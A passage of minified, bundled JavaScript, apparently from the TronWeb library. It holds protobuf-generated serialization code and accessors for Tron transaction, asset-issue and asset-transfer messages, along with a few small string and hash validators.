                    expiration: n.Message.getFieldWithDefault(t, 8, 0),
                    authsList: n.Message.toObjectList(t.getAuthsList(), TronWebProto.authority.toObject, e),
                    data: t.getData_asB64(),
                    contractList: n.Message.toObjectList(t.getContractList(), TronWebProto.Transaction.Contract.toObject, e),
                    scripts: t.getScripts_asB64(),
                    timestamp: n.Message.getFieldWithDefault(t, 14, 0),
                    feeLimit: n.Message.getFieldWithDefault(t, 18, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Transaction.raw.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Transaction.raw;
                return TronWebProto.Transaction.raw.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Transaction.raw.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setRefBlockBytes(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setRefBlockNum(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setRefBlockHash(r);
                        break;
                    case 8:
                        r = t.readInt64();
                        e.setExpiration(r);
                        break;
                    case 9:
                        r = new TronWebProto.authority;
                        t.readMessage(r, TronWebProto.authority.deserializeBinaryFromReader),
                        e.addAuths(r);
                        break;
                    case 10:
                        r = t.readBytes();
                        e.setData(r);
                        break;
                    case 11:
                        r = new TronWebProto.Transaction.Contract;
                        t.readMessage(r, TronWebProto.Transaction.Contract.deserializeBinaryFromReader),
                        e.addContract(r);
                        break;
                    case 12:
                        r = t.readBytes();
                        e.setScripts(r);
                        break;
                    case 14:
                        r = t.readInt64();
                        e.setTimestamp(r);
                        break;
                    case 18:
                        r = t.readInt64();
                        e.setFeeLimit(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Transaction.raw.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Transaction.raw.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Transaction.raw.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getRefBlockBytes_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getRefBlockNum()) && t.writeInt64(3, r),
                (r = e.getRefBlockHash_asU8()).length > 0 && t.writeBytes(4, r),
                0 !== (r = e.getExpiration()) && t.writeInt64(8, r),
                (r = e.getAuthsList()).length > 0 && t.writeRepeatedMessage(9, r, TronWebProto.authority.serializeBinaryToWriter),
                (r = e.getData_asU8()).length > 0 && t.writeBytes(10, r),
                (r = e.getContractList()).length > 0 && t.writeRepeatedMessage(11, r, TronWebProto.Transaction.Contract.serializeBinaryToWriter),
                (r = e.getScripts_asU8()).length > 0 && t.writeBytes(12, r),
                0 !== (r = e.getTimestamp()) && t.writeInt64(14, r),
                0 !== (r = e.getFeeLimit()) && t.writeInt64(18, r)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockBytes = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockBytes_asB64 = function() {
                return n.Message.bytesAsB64(this.getRefBlockBytes())
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockBytes_asU8 = function() {
                return n.Message.bytesAsU8(this.getRefBlockBytes())
            }
            ,
            TronWebProto.Transaction.raw.prototype.setRefBlockBytes = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockNum = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setRefBlockNum = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockHash = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockHash_asB64 = function() {
                return n.Message.bytesAsB64(this.getRefBlockHash())
            }
            ,
            TronWebProto.Transaction.raw.prototype.getRefBlockHash_asU8 = function() {
                return n.Message.bytesAsU8(this.getRefBlockHash())
            }
            ,
            TronWebProto.Transaction.raw.prototype.setRefBlockHash = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getExpiration = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setExpiration = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getAuthsList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.authority, 9)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setAuthsList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 9, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.addAuths = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 9, e, TronWebProto.authority, t)
            }
            ,
            TronWebProto.Transaction.raw.prototype.clearAuthsList = function() {
                return this.setAuthsList([])
            }
            ,
            TronWebProto.Transaction.raw.prototype.getData = function() {
                return n.Message.getFieldWithDefault(this, 10, "")
            }
            ,
            TronWebProto.Transaction.raw.prototype.getData_asB64 = function() {
                return n.Message.bytesAsB64(this.getData())
            }
            ,
            TronWebProto.Transaction.raw.prototype.getData_asU8 = function() {
                return n.Message.bytesAsU8(this.getData())
            }
            ,
            TronWebProto.Transaction.raw.prototype.setData = function(e) {
                return n.Message.setProto3BytesField(this, 10, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getContractList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Transaction.Contract, 11)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setContractList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 11, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.addContract = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 11, e, TronWebProto.Transaction.Contract, t)
            }
            ,
            TronWebProto.Transaction.raw.prototype.clearContractList = function() {
                return this.setContractList([])
            }
            ,
            TronWebProto.Transaction.raw.prototype.getScripts = function() {
                return n.Message.getFieldWithDefault(this, 12, "")
            }
            ,
            TronWebProto.Transaction.raw.prototype.getScripts_asB64 = function() {
                return n.Message.bytesAsB64(this.getScripts())
            }
            ,
            TronWebProto.Transaction.raw.prototype.getScripts_asU8 = function() {
                return n.Message.bytesAsU8(this.getScripts())
            }
            ,
            TronWebProto.Transaction.raw.prototype.setScripts = function(e) {
                return n.Message.setProto3BytesField(this, 12, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getTimestamp = function() {
                return n.Message.getFieldWithDefault(this, 14, 0)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setTimestamp = function(e) {
                return n.Message.setProto3IntField(this, 14, e)
            }
            ,
            TronWebProto.Transaction.raw.prototype.getFeeLimit = function() {
                return n.Message.getFieldWithDefault(this, 18, 0)
            }
            ,
            TronWebProto.Transaction.raw.prototype.setFeeLimit = function(e) {
                return n.Message.setProto3IntField(this, 18, e)
            }
            ,
            TronWebProto.Transaction.prototype.getRawData = function() {
                return n.Message.getWrapperField(this, TronWebProto.Transaction.raw, 1)
            }
            ,
            TronWebProto.Transaction.prototype.setRawData = function(e) {
                return n.Message.setWrapperField(this, 1, e)
            }
            ,
            TronWebProto.Transaction.prototype.clearRawData = function() {
                return this.setRawData(void 0)
            }
            ,
            TronWebProto.Transaction.prototype.hasRawData = function() {
                return null != n.Message.getField(this, 1)
            }
            ,
            TronWebProto.Transaction.prototype.getSignatureList = function() {
                return n.Message.getRepeatedField(this, 2)
            }
            ,
            TronWebProto.Transaction.prototype.getSignatureList_asB64 = function() {
                return n.Message.bytesListAsB64(this.getSignatureList())
            }
            ,
            TronWebProto.Transaction.prototype.getSignatureList_asU8 = function() {
                return n.Message.bytesListAsU8(this.getSignatureList())
            }
            ,
            TronWebProto.Transaction.prototype.setSignatureList = function(e) {
                return n.Message.setField(this, 2, e || [])
            }
            ,
            TronWebProto.Transaction.prototype.addSignature = function(e, t) {
                return n.Message.addToRepeatedField(this, 2, e, t)
            }
            ,
            TronWebProto.Transaction.prototype.clearSignatureList = function() {
                return this.setSignatureList([])
            }
            ,
            TronWebProto.Transaction.prototype.getRetList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Transaction.Result, 5)
            }
            ,
            TronWebProto.Transaction.prototype.setRetList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 5, e)
            }
            ,
            TronWebProto.Transaction.prototype.addRet = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 5, e, TronWebProto.Transaction.Result, t)
            }
            ,
            TronWebProto.Transaction.prototype.clearRetList = function() {
                return this.setRetList([])
            }
            ,
            TronWebProto.AccountType = {
                NORMAL: 0,
                ASSETISSUE: 1,
                CONTRACT: 2
            },
            o.object.extend(t, TronWebProto)
        }
        ,
        1198: e => {
            "use strict";
            e.exports = function() {
                throw new Error("ws does not work in the browser. Browser clients must use the native WebSocket object")
            }
        }
        ,
        1238: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                o.default)(e);
                var r = t ? new RegExp("^[".concat(t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "]+"),"g") : /^\s+/g;
                return e.replace(r, "")
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        1456: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                return (0,
                o.default)(e),
                new RegExp("^[a-fA-F0-9]{".concat(i[t], "}$")).test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                md5: 32,
                md4: 32,
                sha1: 40,
                sha256: 64,
                sha384: 96,
                sha512: 128,
                ripemd128: 32,
                ripemd160: 40,
                tiger128: 32,
                tiger160: 40,
                tiger192: 48,
                crc32: 8,
                crc32b: 8
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        1468: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                if ((0,
                o.default)(e),
                !i.test(e))
                    return !1;
                for (var t = 0, r = 0; r < e.length; r++)
                    t += r % 3 === 0 ? 3 * e[r] : r % 3 === 1 ? 7 * e[r] : 1 * e[r];
                return t % 10 === 0
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^(?!(1[3-9])|(20)|(3[3-9])|(4[0-9])|(5[0-9])|(60)|(7[3-9])|(8[1-9])|(9[0-2])|(9[3-9]))[0-9]{9}$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        1491: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")();
            o.exportSymbol("TronWebProto.AssetIssueContract", null, i),
            o.exportSymbol("TronWebProto.AssetIssueContract.FrozenSupply", null, i),
            o.exportSymbol("TronWebProto.ParticipateAssetIssueContract", null, i),
            o.exportSymbol("TronWebProto.TransferAssetContract", null, i),
            o.exportSymbol("TronWebProto.UnfreezeAssetContract", null, i),
            o.exportSymbol("TronWebProto.UpdateAssetContract", null, i),
            TronWebProto.AssetIssueContract = function(e) {
                n.Message.initialize(this, e, 0, -1, TronWebProto.AssetIssueContract.repeatedFields_, null)
            }
            ,
            o.inherits(TronWebProto.AssetIssueContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AssetIssueContract.displayName = "TronWebProto.AssetIssueContract"),
            TronWebProto.AssetIssueContract.FrozenSupply = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AssetIssueContract.FrozenSupply, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AssetIssueContract.FrozenSupply.displayName = "TronWebProto.AssetIssueContract.FrozenSupply"),
            TronWebProto.TransferAssetContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.TransferAssetContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.TransferAssetContract.displayName = "TronWebProto.TransferAssetContract"),
            TronWebProto.UnfreezeAssetContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UnfreezeAssetContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UnfreezeAssetContract.displayName = "TronWebProto.UnfreezeAssetContract"),
            TronWebProto.UpdateAssetContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.UpdateAssetContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.UpdateAssetContract.displayName = "TronWebProto.UpdateAssetContract"),
            TronWebProto.ParticipateAssetIssueContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.ParticipateAssetIssueContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.ParticipateAssetIssueContract.displayName = "TronWebProto.ParticipateAssetIssueContract"),
            TronWebProto.AssetIssueContract.repeatedFields_ = [5],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AssetIssueContract.prototype.toObject = function(e) {
                return TronWebProto.AssetIssueContract.toObject(e, this)
            }
            ,
            TronWebProto.AssetIssueContract.toObject = function(e, t) {
                var r = {
                    id: n.Message.getFieldWithDefault(t, 41, ""),
                    ownerAddress: t.getOwnerAddress_asB64(),
                    name: t.getName_asB64(),
                    abbr: t.getAbbr_asB64(),
                    totalSupply: n.Message.getFieldWithDefault(t, 4, 0),
                    frozenSupplyList: n.Message.toObjectList(t.getFrozenSupplyList(), TronWebProto.AssetIssueContract.FrozenSupply.toObject, e),
                    trxNum: n.Message.getFieldWithDefault(t, 6, 0),
                    precision: n.Message.getFieldWithDefault(t, 7, 0),
                    num: n.Message.getFieldWithDefault(t, 8, 0),
                    startTime: n.Message.getFieldWithDefault(t, 9, 0),
                    endTime: n.Message.getFieldWithDefault(t, 10, 0),
                    order: n.Message.getFieldWithDefault(t, 11, 0),
                    voteScore: n.Message.getFieldWithDefault(t, 16, 0),
                    description: t.getDescription_asB64(),
                    url: t.getUrl_asB64(),
                    freeAssetNetLimit: n.Message.getFieldWithDefault(t, 22, 0),
                    publicFreeAssetNetLimit: n.Message.getFieldWithDefault(t, 23, 0),
                    publicFreeAssetNetUsage: n.Message.getFieldWithDefault(t, 24, 0),
                    publicLatestFreeNetTime: n.Message.getFieldWithDefault(t, 25, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AssetIssueContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AssetIssueContract;
                return TronWebProto.AssetIssueContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AssetIssueContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 41:
                        var r = t.readString();
                        e.setId(r);
                        break;
                    case 1:
                        r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setName(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setAbbr(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setTotalSupply(r);
                        break;
                    case 5:
                        r = new TronWebProto.AssetIssueContract.FrozenSupply;
                        t.readMessage(r, TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader),
                        e.addFrozenSupply(r);
                        break;
                    case 6:
                        r = t.readInt32();
                        e.setTrxNum(r);
                        break;
                    case 7:
                        r = t.readInt32();
                        e.setPrecision(r);
                        break;
                    case 8:
                        r = t.readInt32();
                        e.setNum(r);
                        break;
                    case 9:
                        r = t.readInt64();
                        e.setStartTime(r);
                        break;
                    case 10:
                        r = t.readInt64();
                        e.setEndTime(r);
                        break;
                    case 11:
                        r = t.readInt64();
                        e.setOrder(r);
                        break;
                    case 16:
                        r = t.readInt32();
                        e.setVoteScore(r);
                        break;
                    case 20:
                        r = t.readBytes();
                        e.setDescription(r);
                        break;
                    case 21:
                        r = t.readBytes();
                        e.setUrl(r);
                        break;
                    case 22:
                        r = t.readInt64();
                        e.setFreeAssetNetLimit(r);
                        break;
                    case 23:
                        r = t.readInt64();
                        e.setPublicFreeAssetNetLimit(r);
                        break;
                    case 24:
                        r = t.readInt64();
                        e.setPublicFreeAssetNetUsage(r);
                        break;
                    case 25:
                        r = t.readInt64();
                        e.setPublicLatestFreeNetTime(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AssetIssueContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AssetIssueContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AssetIssueContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getId()).length > 0 && t.writeString(41, r),
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getName_asU8()).length > 0 && t.writeBytes(2, r),
                (r = e.getAbbr_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getTotalSupply()) && t.writeInt64(4, r),
                (r = e.getFrozenSupplyList()).length > 0 && t.writeRepeatedMessage(5, r, TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter),
                0 !== (r = e.getTrxNum()) && t.writeInt32(6, r),
                0 !== (r = e.getPrecision()) && t.writeInt32(7, r),
                0 !== (r = e.getNum()) && t.writeInt32(8, r),
                0 !== (r = e.getStartTime()) && t.writeInt64(9, r),
                0 !== (r = e.getEndTime()) && t.writeInt64(10, r),
                0 !== (r = e.getOrder()) && t.writeInt64(11, r),
                0 !== (r = e.getVoteScore()) && t.writeInt32(16, r),
                (r = e.getDescription_asU8()).length > 0 && t.writeBytes(20, r),
                (r = e.getUrl_asU8()).length > 0 && t.writeBytes(21, r),
                0 !== (r = e.getFreeAssetNetLimit()) && t.writeInt64(22, r),
                0 !== (r = e.getPublicFreeAssetNetLimit()) && t.writeInt64(23, r),
                0 !== (r = e.getPublicFreeAssetNetUsage()) && t.writeInt64(24, r),
                0 !== (r = e.getPublicLatestFreeNetTime()) && t.writeInt64(25, r)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AssetIssueContract.FrozenSupply.prototype.toObject = function(e) {
                return TronWebProto.AssetIssueContract.FrozenSupply.toObject(e, this)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.toObject = function(e, t) {
                var r = {
                    frozenAmount: n.Message.getFieldWithDefault(t, 1, 0),
                    frozenDays: n.Message.getFieldWithDefault(t, 2, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AssetIssueContract.FrozenSupply;
                return TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setFrozenAmount(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setFrozenDays(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getFrozenAmount()) && t.writeInt64(1, r),
                0 !== (r = e.getFrozenDays()) && t.writeInt64(2, r)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.prototype.getFrozenAmount = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.prototype.setFrozenAmount = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.prototype.getFrozenDays = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.AssetIssueContract.FrozenSupply.prototype.setFrozenDays = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getId = function() {
                return n.Message.getFieldWithDefault(this, 41, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setId = function(e) {
                return n.Message.setProto3StringField(this, 41, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getName = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getName_asB64 = function() {
                return n.Message.bytesAsB64(this.getName())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getName_asU8 = function() {
                return n.Message.bytesAsU8(this.getName())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setName = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getAbbr = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getAbbr_asB64 = function() {
                return n.Message.bytesAsB64(this.getAbbr())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getAbbr_asU8 = function() {
                return n.Message.bytesAsU8(this.getAbbr())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setAbbr = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getTotalSupply = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setTotalSupply = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getFrozenSupplyList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.AssetIssueContract.FrozenSupply, 5)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setFrozenSupplyList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 5, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.addFrozenSupply = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 5, e, TronWebProto.AssetIssueContract.FrozenSupply, t)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.clearFrozenSupplyList = function() {
                return this.setFrozenSupplyList([])
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getTrxNum = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setTrxNum = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getPrecision = function() {
                return n.Message.getFieldWithDefault(this, 7, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setPrecision = function(e) {
                return n.Message.setProto3IntField(this, 7, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getNum = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setNum = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getStartTime = function() {
                return n.Message.getFieldWithDefault(this, 9, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setStartTime = function(e) {
                return n.Message.setProto3IntField(this, 9, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getEndTime = function() {
                return n.Message.getFieldWithDefault(this, 10, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setEndTime = function(e) {
                return n.Message.setProto3IntField(this, 10, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getOrder = function() {
                return n.Message.getFieldWithDefault(this, 11, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setOrder = function(e) {
                return n.Message.setProto3IntField(this, 11, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getVoteScore = function() {
                return n.Message.getFieldWithDefault(this, 16, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setVoteScore = function(e) {
                return n.Message.setProto3IntField(this, 16, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getDescription = function() {
                return n.Message.getFieldWithDefault(this, 20, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getDescription_asB64 = function() {
                return n.Message.bytesAsB64(this.getDescription())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getDescription_asU8 = function() {
                return n.Message.bytesAsU8(this.getDescription())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setDescription = function(e) {
                return n.Message.setProto3BytesField(this, 20, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getUrl = function() {
                return n.Message.getFieldWithDefault(this, 21, "")
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getUrl_asB64 = function() {
                return n.Message.bytesAsB64(this.getUrl())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getUrl_asU8 = function() {
                return n.Message.bytesAsU8(this.getUrl())
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setUrl = function(e) {
                return n.Message.setProto3BytesField(this, 21, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getFreeAssetNetLimit = function() {
                return n.Message.getFieldWithDefault(this, 22, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setFreeAssetNetLimit = function(e) {
                return n.Message.setProto3IntField(this, 22, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getPublicFreeAssetNetLimit = function() {
                return n.Message.getFieldWithDefault(this, 23, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setPublicFreeAssetNetLimit = function(e) {
                return n.Message.setProto3IntField(this, 23, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getPublicFreeAssetNetUsage = function() {
                return n.Message.getFieldWithDefault(this, 24, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setPublicFreeAssetNetUsage = function(e) {
                return n.Message.setProto3IntField(this, 24, e)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.getPublicLatestFreeNetTime = function() {
                return n.Message.getFieldWithDefault(this, 25, 0)
            }
            ,
            TronWebProto.AssetIssueContract.prototype.setPublicLatestFreeNetTime = function(e) {
                return n.Message.setProto3IntField(this, 25, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.TransferAssetContract.prototype.toObject = function(e) {
                return TronWebProto.TransferAssetContract.toObject(e, this)
            }
            ,
            TronWebProto.TransferAssetContract.toObject = function(e, t) {
                var r = {
                    assetName: t.getAssetName_asB64(),
                    ownerAddress: t.getOwnerAddress_asB64(),
                    toAddress: t.getToAddress_asB64(),
                    amount: n.Message.getFieldWithDefault(t, 4, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.TransferAssetContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.TransferAssetContract;
                return TronWebProto.TransferAssetContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.TransferAssetContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAssetName(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setToAddress(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setAmount(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.TransferAssetContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.TransferAssetContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.TransferAssetContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAssetName_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(2, r),
                (r = e.getToAddress_asU8()).length > 0 && t.writeBytes(3, r),
                0 !== (r = e.getAmount()) && t.writeInt64(4, r)
            }
            ,
            TronWebProto.TransferAssetContract.prototype.getAssetName = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.TransferAssetContract.prototype.getAssetName_asB64 = function() {
                return n.Message.bytesAsB64(this.getAssetName())
            }
            ,
            TronWebProto.TransferAssetContract.prototype.getAssetName_asU8 = function() {
                return n.Message.bytesAsU8(this.getAssetName())
            }
            ,
